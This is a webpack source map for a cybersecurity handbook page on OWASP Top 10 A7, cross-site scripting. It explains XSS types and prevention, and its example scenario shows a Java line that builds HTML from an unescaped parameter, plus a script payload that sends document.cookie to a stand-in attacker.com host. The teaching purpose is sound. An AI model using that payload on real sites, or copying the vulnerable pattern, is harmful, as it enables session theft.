{"version":3,"sources":["webpack:///../src/owasp_top_10/a7_cross-site_scripting_xss.mdx"],"names":["_frontmatter","layoutProps","MDXLayout","DefaultLayout","MDXContent","components","props","mdxType","parentName","width","height","src","isMDXComponent"],"mappings":"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","file":"component---src-owasp-top-10-a-7-cross-site-scripting-xss-mdx-35613bfc77b47acd9bfc.js","sourcesContent":["import * as React from 'react'\n  /* @jsx mdx */\nimport { mdx } from '@mdx-js/react';\n/* @jsx mdx */\n\nimport DefaultLayout from \"/Users/ulisesgascon/Desktop/WORKSPACE/GS-Projects/cybersecurity-handbook/node_modules/gatsby-theme-docz/src/base/Layout.js\";\nexport const _frontmatter = {};\n\nconst makeShortcode = name => function MDXDefaultShortcode(props) {\n  console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n  return <div {...props} />;\n};\n\nconst layoutProps = {\n  _frontmatter\n};\nconst MDXLayout = DefaultLayout;\nexport default function MDXContent({\n  components,\n  ...props\n}) {\n  return <MDXLayout {...layoutProps} {...props} components={components} mdxType=\"MDXLayout\">\n\n\n    <h1 {...{\n      \"id\": \"a7-cross-site-scripting-xss\"\n    }}>{`A7 Cross-site scripting (XSS)`}</h1>\n    <h2 {...{\n      \"id\": \"definition\"\n    }}>{`Definition`}</h2>\n    <p>{`XSS flaws occur whenever an application includes untrusted data in a new web page without\nproper validation or escaping, or updates an existing web page with user-supplied data using a\nbrowser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the\nvictim’s browser which can hijack user sessions, deface web sites, or redirect the user to\nmalicious sites.`}</p>\n    <h2 {...{\n      \"id\": \"risk-factor-summary\"\n    }}>{`Risk Factor Summary`}</h2>\n    <ul>\n      <li parentName=\"ul\">{`Score: 6.0`}</li>\n      <li parentName=\"ul\">{`Attack Vectors Exploitability: 3`}</li>\n      <li parentName=\"ul\">{`Security Weakness Prevalence: 3`}</li>\n      <li parentName=\"ul\">{`Security Weakness Detectability: 3`}</li>\n      <li parentName=\"ul\">{`Impact Technical: 2`}</li>\n    </ul>\n    <h2 {...{\n      \"id\": \"context\"\n    }}>{`Context`}</h2>\n    <iframe width=\"100%\" height=\"450\" src=\"https://www.youtube.com/embed/IuzU4y-UjLw\">\n    </iframe>\n    <p>{`Automated tools can detect and\nexploit all three forms of XSS, and\nthere are freely available exploitation\nframeworks.`}</p>\n    <p>{`XSS is the second most prevalent issue in the\nOWASP Top 10, and is found in around two-thirds of\nall applications.`}</p>\n    <p>{`Automated tools can find some XSS problems\nautomatically, particularly in mature technologies\nsuch as PHP, J2EE / JSP, and ASP.NET.`}</p>\n    <p>{`The impact of XSS is moderate for\nreflected and DOM XSS, and severe\nfor stored XSS, with remote code\nexecution on the victim's browser,\nsuch as stealing credentials,\nsessions, or delivering malware to the\nvictim.`}</p>\n    <h2 {...{\n      \"id\": \"is-the-application-vulnerable\"\n    }}>{`Is the Application Vulnerable?`}</h2>\n    <p>{`There are three forms of XSS, usually targeting users' browsers:`}</p>\n    <ul>\n      <li parentName=\"ul\">\n        <p parentName=\"li\"><strong parentName=\"p\">{`Reflected XSS:`}</strong>{` The application or API includes unvalidated and\nunescaped user input as part of HTML output. A successful\nattack can allow the attacker to execute arbitrary HTML and\nJavaScript in the victim’s browser. Typically the user will need to\ninteract with some malicious link that points to an attackercontrolled page, such as malicious watering hole websites,\nadvertisements, or similar.`}</p>\n      </li>\n      <li parentName=\"ul\">\n        <p parentName=\"li\"><strong parentName=\"p\">{`Stored XSS:`}</strong>{` The application or API stores unsanitized user\ninput that is viewed at a later time by another user or an\nadministrator. Stored XSS is often considered a high or critical\nrisk.`}</p>\n      </li>\n      <li parentName=\"ul\">\n        <p parentName=\"li\"><strong parentName=\"p\">{`DOM XSS:`}</strong>{` JavaScript frameworks, single-page applications, and\nAPIs that dynamically include attacker-controllable data to a\npage are vulnerable to DOM XSS. Ideally, the application would\nnot send attacker-controllable data to unsafe JavaScript APIs.`}</p>\n      </li>\n    </ul>\n    <p>{`Typical XSS attacks include session stealing, account takeover,\nMFA bypass, DOM node replacement or defacement (such as\ntrojan login panels), attacks against the user's browser such as\nmalicious software downloads, key logging, and other client-side\nattacks.`}</p>\n    <h2 {...{\n      \"id\": \"how-to-prevent\"\n    }}>{`How to Prevent`}</h2>\n    <p>{`Preventing XSS requires separation of untrusted data from\nactive browser content. This can be achieved by:`}</p>\n    <ul>\n      <li parentName=\"ul\">{`Using frameworks that automatically escape XSS by design,\nsuch as the latest Ruby on Rails, React JS. Learn the\nlimitations of each framework's XSS protection and\nappropriately handle the use cases which are not covered.`}</li>\n      <li parentName=\"ul\">{`Escaping untrusted HTTP request data based on the context in\nthe HTML output (body, attribute, JavaScript, CSS, or URL) will\nresolve Reflected and Stored XSS vulnerabilities. The OWASP\n`}<a parentName=\"li\" {...{\n          \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\"\n        }}>{`Cheat Sheet 'XSS Prevention'`}</a>{` has details on the required data\nescaping techniques.`}</li>\n      <li parentName=\"ul\">{`Applying context-sensitive encoding when modifying the\nbrowser document on the client side acts against DOM XSS.\nWhen this cannot be avoided, similar context sensitive\nescaping techniques can be applied to browser APIs as\ndescribed in the `}<a parentName=\"li\" {...{\n          \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\"\n        }}>{`OWASP Cheat Sheet 'DOM based XSS\nPrevention'`}</a>{`.`}</li>\n      <li parentName=\"ul\">{`Enabling a `}<a parentName=\"li\" {...{\n          \"href\": \"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\"\n        }}>{`Content Security Policy (CSP)`}</a>{` is a defense-in-depth\nmitigating control against XSS. It is effective if no other\nvulnerabilities exist that would allow placing malicious code via\nlocal file includes (e.g. path traversal overwrites or vulnerable\nlibraries from permitted content delivery networks).`}</li>\n    </ul>\n    <h2 {...{\n      \"id\": \"conceptual-attacks\"\n    }}>{`Conceptual Attacks`}</h2>\n    <h3 {...{\n      \"id\": \"scenario-1\"\n    }}>{`Scenario #1:`}</h3>\n    <p>{`The application uses untrusted data in the\nconstruction of the following HTML snippet without validation or\nescaping:`}</p>\n    <pre><code parentName=\"pre\" {...{}}>{`(String) page += \"<input name='creditcard' type='TEXT'\nvalue='\" + request.getParameter(\"CC\") + \"'>\";\n`}</code></pre>\n    <p>{`The attacker modifies the ‘CC’ parameter in the browser to:`}</p>\n    <pre><code parentName=\"pre\" {...{}}>{`'><script>document.location=\n'http://www.attacker.com/cgi-bin/cookie.cgi?\nfoo='+document.cookie</script>'\n`}</code></pre>\n    <p>{`This attack causes the victim’s session ID to be sent to the\nattacker’s website, allowing the attacker to hijack the user’s\ncurrent session.`}</p>\n    <p>{`Note: Attackers can use XSS to defeat any automated CrossSite Request Forgery (CSRF) defense the application might\nemploy.`}</p>\n    <h2 {...{\n      \"id\": \"example-attack-scenarios\"\n    }}>{`Example Attack Scenarios`}</h2>\n    <h3 {...{\n      \"id\": \"please-review\"\n    }}>{`Please review`}</h3>\n    <ul>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/docs/attacks_explained/cross-site_scripting_xss\"\n        }}>{`Explained attack: Cross-site scripting (XSS) in this guide`}</a><ul parentName=\"li\">\n          <li parentName=\"ul\"><a parentName=\"li\" {...{\n              \"href\": \"/docs/attacks_explained/cross-site_scripting_xss#reflected-xss\"\n            }}>{`Reflected XSS`}</a></li>\n          <li parentName=\"ul\"><a parentName=\"li\" {...{\n              \"href\": \"/docs/attacks_explained/cross-site_scripting_xss#stored-xss\"\n            }}>{`Stored XSS`}</a></li>\n          <li parentName=\"ul\"><a parentName=\"li\" {...{\n              \"href\": \"/docs/attacks_explained/cross-site_scripting_xss#dom-xss\"\n            }}>{`DOM XSS`}</a></li>\n        </ul></li>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/docs/attacks_explained/cross_site_request_forgery_csrf\"\n        }}>{`Explained attack: Cross Site Request Forgery (CSRF) in this guide`}</a></li>\n      <li parentName=\"ul\">{`The `}<a parentName=\"li\" {...{\n          \"href\": \"/docs/attacks_explained/server-side_request_forgery_ssrf\"\n        }}>{`Explained attack: Server-Side Request Forgery (SSRF) in this guide`}</a></li>\n    </ul>\n    <h2 {...{\n      \"id\": \"hacking-playground\"\n    }}>{`Hacking Playground`}</h2>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://nodegoat.herokuapp.com/tutorial/a7\"\n        }}>{`🐐 NodeGoat | A7 Cross-site scripting (XSS)`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://pwning.owasp-juice.shop/part2/xss.html\"\n        }}>{`🧃 Pwning OWASP Juice Shop | A7 Cross-site scripting (XSS)`}</a></li>\n    </ul>\n    <h2 {...{\n      \"id\": \"references\"\n    }}>{`References`}</h2>\n    <h3 {...{\n      \"id\": \"owasp\"\n    }}>{`OWASP`}</h3>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\"\n        }}>{`OWASP Cheat Sheet: XSS Prevention`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html\"\n        }}>{`OWASP Cheat Sheet: DOM based XSS Prevention`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://owasp.org/www-community//xss-filter-evasion-cheatsheet\"\n        }}>{`OWASP Cheat Sheet: XSS Filter Evasion`}</a></li>\n    </ul>\n    <h3 {...{\n      \"id\": \"cwes\"\n    }}>{`CWEs`}</h3>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://cwe.mitre.org/data/definitions/79.html\"\n        }}>{`CWE-79: Improper neutralization of user supplied input`}</a></li>\n    </ul>\n\n    </MDXLayout>;\n}\n;\nMDXContent.isMDXComponent = true;\n      "],"sourceRoot":""}